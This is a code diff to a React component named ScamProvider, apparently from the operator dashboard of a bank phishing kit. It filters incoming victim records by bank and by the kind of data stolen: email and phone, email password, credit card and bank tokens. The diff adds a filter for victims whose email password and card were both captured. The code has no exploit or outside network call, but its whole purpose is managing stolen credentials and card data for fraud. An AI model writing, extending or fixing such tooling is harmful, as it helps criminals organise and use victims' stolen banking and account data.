@@ -2,7 +2,6 @@
 import React, { useContext, useEffect, useState } from 'react';
 import { createContext } from 'react';
 import { SocketContext } from './SocketContext';
-import dataOptions from '../options.json'
 
 export const ScamContext = createContext();
 
@@ -14,8 +13,8 @@ export const ScamProvider = ({ children }) => {
     const [ users, setUsers ]       = useState([{}]);
     const [ scamName, setScamName ] = useState([]);
     const [ selected, setSelected]  = useState([])
-    // new Set(["todos"])
-    const [ filteredType, setFilteredType] = useState('all')
+    
+    const [ filteredType, setFilteredType] = useState(['all'])
 
     const [notification, setNotification] = useState(false);
 
@@ -40,7 +39,7 @@ export const ScamProvider = ({ children }) => {
             return e;
         })
         
-        if(existUpdate == false) {
+        if(existUpdate === false) {
             setNotification(true)
             return setUsersAll([...users, usuario])
         };
@@ -72,6 +71,7 @@ export const ScamProvider = ({ children }) => {
                 const existBank = user.name === selected ;
                 const existEmail = existBank && filteredType === 'emailAndPhone';
                 const existEmailAndPassword  = existBank && filteredType === 'EmailAndPassword';
+                const existEmailAndPasswordAndTc  = existBank && filteredType === 'EmailAndPasswordAndTc';
                 const existToken = existBank && filteredType === 'token';
                 const existCard  = existBank && filteredType === 'creditCard';
                 const all        = existBank && filteredType === 'all';
@@ -80,6 +80,8 @@ export const ScamProvider = ({ children }) => {
                 if( existEmail && user.correo !== undefined && user.celular !== undefined ) return user;
                 
                 if( existEmailAndPassword && user.claveCorreo !== undefined ) return user;
+
+                if( existEmailAndPasswordAndTc && user.claveCorreo !== undefined && user.tarjeta !== undefined ) return user;
                 
                 if( existToken && (user.token1 !== undefined || user.token2 !== undefined)  ) return user;
                 
